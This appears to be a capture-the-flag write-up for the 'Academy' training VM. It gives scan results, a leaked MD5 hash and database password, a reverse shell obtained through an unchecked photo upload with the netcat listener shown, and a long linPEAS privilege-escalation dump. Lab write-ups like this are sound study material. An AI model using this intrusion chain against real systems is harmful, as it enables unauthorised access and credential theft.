# Academy (172.16.2.129)
[29/July/2023 :: 14:20 ]  nmap scan 

[29/July/2023 :: 14:27 ] HTTP scan

[29/July/2023 :: 14:35 ] FTP scan

[29/July/2023 :: 14:29 ] note.txt discovered   

[29/July/2023 :: 14:44]  password hash identified [MD5]

[29/July/2023 :: 14:47] password cracked [student]

[29/July/2023 :: 15:09] subdirectories found 

[29/July/2023 :: 15:17] Potential Website Vulnerability [ no extension check for student image] 

[29/July/2023 :: 15:20]  Reverse Shell Acquired

[29/July/2023 :: 15:25] Linpeas uplaoded on web server

[29/July/2023 :: 15:50] Found SQL DB credentials

[29/July/2023 :: 15:55] SSH bypassed to grimmie

[29/July/2023 :: 15:57] Backup.sh found 

[29/July/2023 :: 16:10] Root shell recieved 

[29/July/2023 :: 16:16] Flag.txt retrieved

## nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 14:20 PKT
Nmap scan report for 172.16.2.129
Host is up (0.00040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.2.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c744588690fde4de5b0dbf078d055dd7 (RSA)
|   256 78ec470f0f53aaa6054884809476a623 (ECDSA)
|_  256 999c3911dd3553a0291120c7f8bf71a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:A6:6E:61 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 172.16.2.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.07 seconds


### 80
Default Apache Web Page
  Apache httpd 2.4.38 ((Debian))

### 21
FTP with Anonymous login enabled

username: anonymous
password: <empty>

Found note.txt

## Information Disclosure


### Default Page
Too much Architecture Information.


### note.txt
                                      
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta


### flag.txt
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !


## Exploitation
/var/www/html/academy/admin/includes/config.php:
$mysql_password = "My_V3ryS3cur3_P4ss";


### PHP- Reverse Shell
Uploading the reverse shell in student photo option

┌──(root㉿wahaj)-[/home/wahaj/Desktop]└─# nc -lvp 1234    
listening on [any] 1234 ...192.168.1.107: 
inverse host lookup failed: Unknown hostconnect to [192.168.1.107] from (UNKNOWN) [192.168.1.107] 55133
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux 06:22:17 up  1:04,  1 user,  load average: 0.00, 0.54, 1.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   14:41   0.04s  0.01s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty;
 job control turned off$whoami
 www-data

### Privilege Escalation
We are www-data users so we have to get root access.

Executing linPEAS



#### linpeas
 linpeas v2.2.7 by carlospolop
                                                                                                                                                               
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                                                                       
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                    
                                                                                                                                                               

====================================( System Information )====================================
[+] Operative system                                                                                                                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
sudo Not Found                                                                                                                                                 
                                                                                                                                                               
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Jul 29 06:37:17 EDT 2023                                                                                                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                               
/dev/sda1       6.9G  1.9G  4.7G  29% /
udev            479M     0  479M   0% /dev
tmpfs           494M     0  494M   0% /dev/shm
tmpfs            99M  4.3M   95M   5% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/0
              total        used        free      shared  buff/cache   available
Mem:        1009960      178916      474532       10816      356512      640884
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                                 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:13967
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                                                                       
[+] Is this a container? .......... No                                                                                                                         
[+] Is ASLR enabled? .......... Yes                                                                                                                            

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                           
sda                                                                                                                                                            
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                    
UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  
UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


====================================( Available Software )====================================
[+] Useful software?                                                                                                                                           
/usr/bin/nc                                                                                                                                                    
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/php

[+] Installed compilers?
Compilers Not Found                                                                                                                                            
                                                                                                                                                               

================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                          
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       
root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/init
root       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journald
root       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevd
systemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncd
root       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -f
root       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logind
message+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONE
root       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --
root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -D
root       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k start
mysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqld
www-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k start
root       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --user
root       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)
root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bash
root       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclient
root      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclient
www-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -i
www-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.sh
www-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                      
 56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                       
   0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd
144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd
   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd
164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 
-rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * /home/grimmie/backup.sh

[+] Services
[i] Search for outdated versions                                                                                                                               
 [ - ]  apache-htcacheclean                                                                                                                                    
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  mysql
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  ssh
 [ + ]  udev
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                    
academy                                                                                                                                                        
127.0.0.1       localhost
127.0.1.1       academy.tcm.sec academy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 172.16.2.2
tcm.sec

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                                                                      
                                                                                                                                                               
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                        
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff
    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33
       valid_lft 1638sec preferred_lft 1638sec
    inet6 fe80::20c:29ff:fea6:6e61/64 scope link 
       valid_lft forever preferred_lft forever
172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE
172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE
172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE

[+] Iptables rules
iptables rules Not Found                                                                                                                                       
                                                                                                                                                               
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                            
                                                                                                                                                               
[+] Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               

====================================( Users Information )=====================================
[+] My user                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

[+] Do I have PGP keys?
gpg Not Found                                                                                                                                                  
                                                                                                                                                               
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                       
                                                                                                                                                               
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
                                                                                                                                                               
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                       
                                                                                                                                                               
[+] Checking Pkexec policy
                                                                                                                                                               
[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
                                                                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                

[+] Users with console
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   
root:x:0:0:root:/root:/bin/bash

[+] Login information
 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   29:42   0.04s  0.01s -bash
root     tty1                          Sat May 29 13:31 - down   (00:12)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)
root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)
root     tty1                          Sat May 29 13:16 - down   (00:11)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)
root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)
administ tty1                          Sat May 29 13:06 - down   (00:08)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)

wtmp begins Sat May 29 13:05:58 2021

[+] All users
_apt                                                                                                                                                           
backup
bin
daemon
ftp
games
gnats
grimmie
irc
list
lp
mail
man
messagebus
mysql
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                              
mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                    
[+] MySQL connection using root/NOPASS ................. No                                                                                                    
[+] Looking for mysql credentials and exec                                                                                                                     
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                       
                                                                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                                                                                                
Server built:   2020-08-25T20:08:29

[+] Looking for PHPCookies
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                     
                                                                                                                                                               
[+] Mongo information
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                     
                                                                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                            
                                                                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                      
                                                                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                      
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for ssl/ssh files
PermitRootLogin yes                                                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                             
                                                                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/etc/exports Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          
krb5.conf Not Found                                                                                                                                            
tickets kerberos Not Found                                                                                                                                     
klist Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                           
                                                                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                 
                                                                                                                                                               
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
screen Not Found                                                                                                                                               
                                                                                                                                                               
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
tmux Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for Couchdb directory
                                                                                                                                                               
[+] Looking for redis.conf
                                                                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                  
                                                                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                                                                               

====================================( Interesting Files )=====================================
[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/su
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/sbin/unix_chkpwd                                                                                                                                          
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   
/usr/bin/ping = cap_net_raw+ep                                                                                                                                 

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 20                                                                                                                                                       
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh
-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                                                                    
[+] Can I read root folder? ........... No                                                                                                                     
                                                                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                          

[+] Looking for root files in folders owned by me
                                                                                                                                                               
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
[+] Files inside /home/www-data (limit 20)
                                                                                                                                                               
[+] Files inside others home (limit 20)
/home/grimmie/.bash_history                                                                                                                                    
/home/grimmie/.bashrc
/home/grimmie/backup.sh
/home/grimmie/.profile
/home/grimmie/.bash_logout

[+] Looking for installed mail applications
                                                                                                                                                               
[+] Mails (limit 50)
                                                                                                                                                               
[+] Backup files?
-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                               
[+] Web files?(output limit)
/var/www/:                                                                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K May 29  2021 .
drwxr-xr-x 12 root root 4.0K May 29  2021 ..
drwxr-xr-x  3 root root 4.0K May 29  2021 html

/var/www/html:
total 24K
drwxr-xr-x 3 root     root     4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 29  2021 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            
-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc
-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                        
   270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml
   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml
   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml
   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml
   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml
   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml
   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist
